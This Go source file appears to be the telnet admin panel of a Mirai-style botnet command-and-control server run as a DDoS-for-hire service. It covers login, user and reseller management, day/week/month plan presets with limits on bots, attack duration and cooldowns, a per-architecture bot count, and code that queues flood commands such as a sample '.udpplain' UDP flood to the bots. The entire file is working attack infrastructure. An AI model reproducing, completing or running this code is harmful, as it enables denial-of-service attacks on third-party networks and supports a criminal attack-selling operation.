package main

import (
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/alexeyco/simpletable"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

var previousDistribution map[string]int
var GlobalSlots = 0

func (a *Admin) SlotsCooldown(username string) {
	GlobalSlots++
	for _ = range time.Tick(time.Second * 60) {
		GlobalSlots--
		break
	}
}

func BroadcastMessage(message string) {
	for _, session := range sessions {
		session.Println(fmt.Sprintf("\r\n\u001B[1;43m[ BROADCAST ]\x1b[0m %s", message))
	}
}

type TimeoutInfo struct {
	Timeout  time.Time
	Duration int
	KickUser bool
}

var (
	timeoutMutex sync.Mutex
	timeouts     = make(map[string]TimeoutInfo)
)

func UserTimeout(username string, duration int) (string, bool) {
	timeoutMutex.Lock()
	defer timeoutMutex.Unlock()

	if _, exists := timeouts[username]; exists {
		return "User is already timed out.", false
	}

	expirationTime := time.Now().Add(time.Duration(duration) * time.Minute)

	timeouts[username] = TimeoutInfo{
		Timeout:  expirationTime,
		Duration: duration,
		KickUser: true,
	}

	if timeouts[username].KickUser {
		msg, success := KickUser(username)
		if !success {
			return msg, false
		}
	}

	return fmt.Sprintf("User %s has been timed out for %d minutes.", username, duration), true
}

func UserUntimeout(username string) (string, bool) {
	timeoutMutex.Lock()
	defer timeoutMutex.Unlock()

	if timeoutInfo, exists := timeouts[username]; exists {
		delete(timeouts, username)

		if timeoutInfo.KickUser {
		}

		return fmt.Sprintf("User %s has been untimed out.", username), true
	}

	return "User is not currently timed out.", false
}

func KickUser(username string) (msg string, success bool) {
	sessionMutex.Lock()
	defer sessionMutex.Unlock()

	for id, session := range sessions {
		if session.Username == username {
			err := session.Conn.Close()
			if err != nil {
				return fmt.Sprintf("Could not kick user: %v", err), false
			}
			delete(sessions, id)
			return fmt.Sprintf("User %s disconnected successfully", username), true
		}
	}
	return fmt.Sprintf("User %s not found in any session", username), false
}

func isTimedOut(username string) bool {
	timeoutMutex.Lock()
	defer timeoutMutex.Unlock()

	if timeoutInfo, exists := timeouts[username]; exists {
		remainingDuration := timeoutInfo.Timeout.Sub(time.Now()) // calculating duration left on timeout
		if remainingDuration > 0 {
			return true
		}
		delete(timeouts, username) // expired; remove them from timeout
	}
	return false
}

func (a *Admin) Handle() {
	a.Printf("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22")
	defer func() {
		a.Printf("\u001B[?1049l")
	}()

	err := Display(a, "assets/branding/login.txt", "")
	if err != nil {
		return
	}

	username, err := a.ReadLine("\u001B[9;35f\u001B[0m\u001B[48;5;235m\u001B[4m", false)
	if err != nil {
		return
	}

	err = a.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if err != nil {
		return
	}
	password, err := a.ReadLine("\u001B[11;35f\u001B[0m\u001B[48;5;235m\u001B[4m", true)
	if err != nil {
		return
	}
	err = a.conn.SetDeadline(time.Now().Add(120 * time.Second))
	if err != nil {
		return
	}

	// check if the user is timed out
	if timedOut := isTimedOut(username); timedOut {
		// user is timed out
		a.Clear()
		a.Println("You are currently timed out and cannot log in.\r\n")

		// calculate remaining duration here
		timeoutInfo, exists := timeouts[username]
		if exists {
			remainingDuration := timeoutInfo.Timeout.Sub(time.Now())
			if remainingDuration > 0 {
				minutes := remainingDuration.Minutes()
				a.Printf("Your timeout expires in %.0f minutes.\n", minutes)
			} else {
				a.Println("Your timeout has already expired.")
			}
		}

		return
	}

	var loggedIn bool
	var userInfo AccountInfo

	if loggedIn, userInfo, _ = database.TryLogin(username, password, a.conn.RemoteAddr().String()); !loggedIn {
		a.Printf("\033]0;Invalid Credentials! \007")
		buf := make([]byte, 1)
		_, err := a.conn.Read(buf)
		if err != nil {
			return
		}
		return
	} else {
		log.Printf("[admin - login] '%s' logged in from %s\n", username, a.conn.RemoteAddr().String())
	}

	if time.Now().After(userInfo.Expiry) {
		err := Display(a, "assets/branding/expired.txt", username)
		if err != nil {
			return
		}
	}

	go func() {
		i := 0
		for {
			time.Sleep(time.Second)
			err := DisplayTitle(a, username)
			if err != nil {
				return
			}

			i++
			if i%10 == 0 {
				err := a.conn.SetDeadline(time.Now().Add(120 * time.Second))
				if err != nil {
					fmt.Printf("[admin - titleinvtl] %v", err)
					return
				}
			}
		}
	}()

	var Floods int

	var session = &session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     a.conn,
		Account:  userInfo,
		Floods:   Floods,
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	a.Clear()
	err = Display(a, "./assets/branding/banner.txt", username)
	if err != nil {
		return
	}

	for {
		var botCat string
		var botCount int
		go session.FetchAttacks(username)
		prompt, err := DisplayPrompt(username)
		if err != nil {
			fmt.Println(err)
			return
		}
		a.Printf(prompt)
		cmd, err := a.ReadLine("", false)
		cmd = strings.ToLower(cmd)

		if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
			err := Display(a, "./assets/branding/banner.txt", username)
			if err != nil {
				return
			}
			continue
		}
		if err != nil || cmd == "logout" || cmd == "exit" {
			return
		}

		if err != nil || cmd == "?" || cmd == "help" || cmd == "methods" {
			err := Display(a, "./assets/branding/help.txt", username)
			if err != nil {
				return
			}
			continue
		}
		if cmd == "" {
			continue
		}

		if err != nil || strings.Split(strings.ToLower(cmd), " ")[0] == "ongoing" {
			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			currently, err := database.Ongoing()
			if err != nil {
				continue
			}

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Method"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Ends in"},
					{Align: simpletable.AlignCenter, Text: "Length"},
					{Align: simpletable.AlignCenter, Text: "Username"},
				},
			}

			for poc, attacks := range currently {

				attackingUser, err := database.GetUserID(attacks.UserID)
				if err != nil {
					continue
				}

				target := strings.Split(attacks.Command, " ")[1]
				if len(target) > 15 {
					target = target[:15] + "..."
				}

				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(poc)},
					{Align: simpletable.AlignCenter, Text: strings.Split(attacks.Command, " ")[0]},
					{Align: simpletable.AlignCenter, Text: target},
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(attacks.Duration)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.2f Seconds", time.Until(time.Unix(attacks.Attacked+int64(attacks.Duration), 64)).Seconds())},
					{Align: simpletable.AlignCenter, Text: attackingUser.Username},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if cmd == "broadcast" {
			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
			}
			a.Println("Provide a message to broadcast")
			continue
		}

		if strings.HasPrefix(cmd, "broadcast ") {
			message := strings.TrimPrefix(cmd, "broadcast ")
			if userInfo.Admin {
				BroadcastMessage(message)
			} else {
				a.Println("You aren't authorized to use this.")
			}
			continue
		}

		if userInfo.Admin && cmd == "clearlogs" {
			confirm, err := a.ReadLine("Are you sure? (y/n): ", false)
			if confirm != "y" {
				continue
			}
			if err != nil {
				a.Println(fmt.Sprintf("unable to clear logs: %v", err))
				continue
			}
			if !database.CleanLogs() {
				a.Println("Unable to clear logs, try again later.")
			}
			a.Println("all logs have been cleared successfully!")
			fmt.Printf("[warn] %s cleared all attack logs!\n", username)
			continue
		}

		if userInfo.Admin && cmd == "attacks" {
			if GlobalAttacks {
				a.Println("\u001B[0mAttacks are now \u001B[31mdisabled\u001B[0m.")
				GlobalAttacks = false
			} else {
				a.Println("\u001B[0mAttacks are now \u001B[92menabled\u001B[0m.")
				GlobalAttacks = true
			}
			continue
		}

		if cmd == "users" { // TODO: Simplify this and make it show expiry
			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			activeUsers, err := database.Users()
			if err != nil {
				fmt.Println(err)
				continue
			}

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Username"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Administrator"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Attacks"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Max Time"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Cooldown"},
				},
			}

			for _, user := range activeUsers {
				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if user.Admin {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(user.Bots)
				if user.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.GetTotalAttacks(user.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}
				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + user.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.MaxTime)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.Cooldown)},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if strings.HasPrefix(cmd, "users add") {
			args := strings.Fields(cmd)

			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 11 {
				a.Println("Usage: users add <Username> <Password> [...options]")
				a.Println("Example: users add newuser secretpass -1 60 100 100 1d false false")
				a.Println("")
				a.Println("Add argument documentation:")
				a.Println("   Username          -   The username of the new user")
				a.Println("   Password          -   The New_pass of the new user")
				a.Println("   Max Bots          -   The maximum number of devices the new user can access")
				a.Println("   Attack Duration   -   The maximum attack duration for the new user")
				a.Println("   Attack Cooldown   -   The cooldown between attacks for the new user")
				a.Println("   Max Daily Attacks -   The maximum number of attacks per day for the new user")
				a.Println("   Account Expiry    -   The time before the new user's account expires (e.g., 1d1w1m1s)")
				a.Println("   Admin Status      -   Is the new user an admin?")
				a.Println("   Reseller Status   -   Is the new user a reseller?")
				a.Println("")
				a.Println("Remove argument documentation:")
				a.Println("   Username          -   The user to remove")
				continue
			}

			NewUser := args[2]
			NewPass := args[3]
			maxBotsStr := args[4]
			durationStr := args[5]
			cooldownStr := args[6]
			userMaxAttacksStr := args[7]
			expiryHoursStr := args[8]
			isAdminStr := args[9]
			isResellerStr := args[10]

			// Convert and parse the arguments as needed
			maxBots, err := strconv.Atoi(maxBotsStr)
			if err != nil {
				a.Println("Invalid Max Bots value.")
				continue
			}
			duration, err := strconv.Atoi(durationStr)
			if err != nil {
				a.Println("Invalid Attack Duration value.")
				continue
			}
			cooldown, err := strconv.Atoi(cooldownStr)
			if err != nil {
				a.Println("Invalid Attack Cooldown value.")
				continue
			}
			userMaxAttacks, err := strconv.Atoi(userMaxAttacksStr)
			if err != nil {
				a.Println("Invalid Max Daily Attacks value.")
				continue
			}
			expiryDuration, err := parseDuration(expiryHoursStr)
			if err != nil {
				a.Println("Invalid time format: ", err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()
			isAdmin, err := strconv.ParseBool(isAdminStr)
			if err != nil {
				a.Println("Invalid Admin Status value.")
				continue
			}
			isReseller, err := strconv.ParseBool(isResellerStr)
			if err != nil {
				a.Println("Invalid Reseller Status value.")
				continue
			}

			if userInfo.Reseller && !userInfo.Admin && isAdmin {
				a.Println("Resellers cannot add admin users.")
				continue
			}

			if userInfo.Reseller && !userInfo.Admin && isReseller {
				a.Println("Resellers cannot add other resellers.")
				continue
			}

			if database.createUser(NewUser, NewPass, maxBots, userMaxAttacks, duration, cooldown, expiry, isAdmin, isReseller, NewUser) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if strings.HasPrefix(cmd, "users remove") {
			args := strings.Fields(cmd)

			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: users remove <username>, e.g., users remove tester")
				continue
			}

			usernameToRemove := args[2]

			if userInfo.Reseller && !database.CheckUserCreatedBy(usernameToRemove, username) && !userInfo.Admin {
				a.Println("Resellers can only remove users they have created.")
				continue
			}

			KickUser(usernameToRemove)

			err := database.RemoveUser(usernameToRemove)
			if err != nil {
				a.Println("Error removing user: ", err)
				continue
			}
			a.Println(fmt.Sprintf("Removed @%s successfully.", usernameToRemove))
			continue
		}

		if strings.HasPrefix(cmd, "users timeout") {
			args := strings.Fields(cmd)

			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: users timeout <username> <duration>, e.g., users timeout tester 5")
				continue
			}
			usernameToTimeout := args[2]
			timeoutDurationStr := args[3]
			timeoutDuration, err := strconv.Atoi(timeoutDurationStr)
			if err != nil {
				a.Println("Invalid duration value.")
				continue
			}

			msg, success := UserTimeout(usernameToTimeout, timeoutDuration)
			a.Println(msg)
			if success {
				log.Printf("[admin - timeout] User '%s' has been timed out for %d minutes\n", usernameToTimeout, timeoutDuration)
				continue
			}
			continue
		}

		if strings.HasPrefix(cmd, "users timeout") {
			args := strings.Fields(cmd)

			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: users untimeout <username>, e.g., users untimeout tester")
				continue
			}

			usernameToUntimeout := args[2]
			msg, success := UserUntimeout(usernameToUntimeout)
			a.Println(msg)
			if success {
				// Optionally, log the untimeout action
				log.Printf("[admin - untimeout] User '%s' has been untimed out\n", usernameToUntimeout)
			}
			continue
		}

		if strings.HasPrefix(cmd, "sessions kick") {
			args := strings.Fields(cmd)

			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: sessions kick <username>, e.g., sessions kick tester")
				continue
			}

			usernameToRemove := args[2]
			KickUser(usernameToRemove)
			a.Println("Kicked " + usernameToRemove + " successfully")
			continue
		}

		if strings.HasPrefix(cmd, "presets use") {
			args := strings.Fields(cmd)

			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 5 {
				a.Println("Usage: presets use <username> <password> <preset>")
				a.Println("Example: presets use example change!me day")
				a.Println("")
				a.Println("Preset argument documentation:")
				a.Println("   day   -   one day plan with the default settings")
				a.Println("   week  -   one week plan with the default settings")
				a.Println("   month -   one month plan with the default settings")
				continue
			}

			NewUser := args[2]
			NewPass := args[3]
			preset := args[4]

			var maxBots int
			var duration int
			var cooldown int
			var userMaxAttacks int
			var expiry1 string
			var isAdmin bool
			var isReseller bool

			switch preset {
			case "day":
				maxBots = -1
				duration = 60
				cooldown = 100
				userMaxAttacks = 100
				expiry1 = "1d"
				isAdmin = false
				isReseller = false
			case "week":
				maxBots = -1
				duration = 60
				cooldown = 100
				userMaxAttacks = 100
				expiry1 = "7d"
				isAdmin = false
				isReseller = false
			case "month":
				maxBots = -1
				duration = 60
				cooldown = 100
				userMaxAttacks = 100
				expiry1 = "30d"
				isAdmin = false
				isReseller = false
			default:
				a.Println("Invalid preset. Available presets are: day, week, month.")
				continue
			}

			expiryDuration, err := parseDuration(expiry1)
			if err != nil {
				a.Println(err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()

			if database.createUser(NewUser, NewPass, maxBots, userMaxAttacks, duration, cooldown, expiry, isAdmin, isReseller, username) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if err != nil || strings.ToLower(strings.Split(cmd, " ")[0]) == "sessions" { // TODO: Simplify this and make it show expiry
			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Username"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Administrator"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Attacks"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Remote Host"},
				},
			}

			for _, s := range sessions {
				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if s.Account.Admin {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(s.Account.Bots)
				if s.Account.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.GetTotalAttacks(s.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}

				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + s.Account.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strings.Split(s.Conn.RemoteAddr().String(), ":")[0]},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if cmd == "passwd" {
			newPw, _ := a.ReadLine("New Password: ", true)
			newPwConfirm, _ := a.ReadLine("New Password (confirm): ", true)

			if newPwConfirm != newPw {
				a.Println("Your password must match in both inputs.")
				continue
			}
			err := database.changepw(username, newPw)
			if err != nil {
				a.Println("unknown error. Try again later!")
				continue
			}
			continue
		}

		if cmd == "bots" {
			if !userInfo.Admin {
				a.Println("You aren't authorized to do this!")
				continue
			}

			m := clientList.Distribution()

			if previousDistribution != nil {
				for k, v := range m {
					change := v - previousDistribution[k]
					colorCode := "\x1b[92m"
					if change < 0 {
						colorCode = "\x1b[91m"
					}
					changeSign := "+"
					if change < 0 {
						changeSign = ""
					}
					if change != 0 {
						a.Printf("\u001B[0m%s: %d \u001B[0m(%s%s%d\x1b[0m)\r\n", k, v, colorCode, changeSign, change)
					} else {
						a.Printf("\u001B[0m%s: %d\r\n", k, v)
					}
				}
			} else {
				for k, v := range m {
					a.Printf("\u001B[0m%s: %d\r\n", k, v)
				}
			}

			previousDistribution = m
			continue
		}

		if cmd[0] == '@' {
			if !userInfo.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			cataSplit := strings.SplitN(cmd, " ", 2)

			if len(cataSplit) > 1 {
				botCat = cataSplit[0][1:]
				cmd = cataSplit[1]
			} else {
				a.Println("Usage: @<group> <command>")
				a.Println("Example: @x86 .udpplain 70.70.70.72 30 dport=80 size=1400")
				continue
			}
		}

		botCount = userInfo.Bots
		var xd int
		if userInfo.Admin {
			xd = 1
		} else {
			xd = 0
		}
		atk, err := NewAttack(cmd, xd, username)
		if err != nil {
			session.Println(err.Error())
		} else {
			buf, err := atk.Build()
			if err != nil {
				session.Println(err.Error())
			} else {
				if GlobalSlots >= MaxGlobalSlots {
					a.Println("All attack slots are in use, please wait.")
					continue
				}
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					session.Println(err.Error())
				} else {
					go a.SlotsCooldown(username)
					err := Display(a, "assets/branding/attack_sent.txt", username)
					if err != nil {
						continue
					}
					clientList.QueueBuf(buf, botCount, botCat)
					err = database.IncreaseTotalAttacks(username)
					if err != nil {
						fmt.Println(err)
						continue
					}
				}
			}
		}
	}
}

func (a *Admin) ReadLine(prompt string, masked bool) (string, error) {
	buf := make([]byte, 2048)
	pos := 0

	if len(prompt) >= 1 {
		a.Printf(prompt)
	}

	for {
		if len(buf) < pos+2 {
			fmt.Println("BUFF LEN:", len(buf))
			fmt.Println("Prevented Buffer Overflow.", a.conn.RemoteAddr())
			return string(buf), nil
		}

		n, err := a.conn.Read(buf[pos : pos+1])
		if err != nil || n != 1 {
			return "", err
		}
		switch buf[pos] {
		case 0xFF:
			n, err := a.conn.Read(buf[pos : pos+2])
			if err != nil || n != 2 {
				return "", err
			}
			pos--
		case 0x7F, 0x08:
			if pos > 0 {
				a.Printf("\b \b")
				pos--
			}
			pos--
		case 0x0D, 0x09:
			pos--
		case 0x0A, 0x00:
			a.Printf("\r\n")
			return string(buf[:pos]), nil
		case 0x03:
			a.Printf("^C\r\n")
			return "", nil
		default:
			if buf[pos] == 0x1B {
				buf[pos] = '^'
				a.Printf(string(buf[pos]))
				pos++
				buf[pos] = '['
				a.Printf(string(buf[pos]))
			} else if masked {
				a.Printf("*")
			} else {
				a.Printf(string(buf[pos]))
			}
		}
		pos++
	}
}
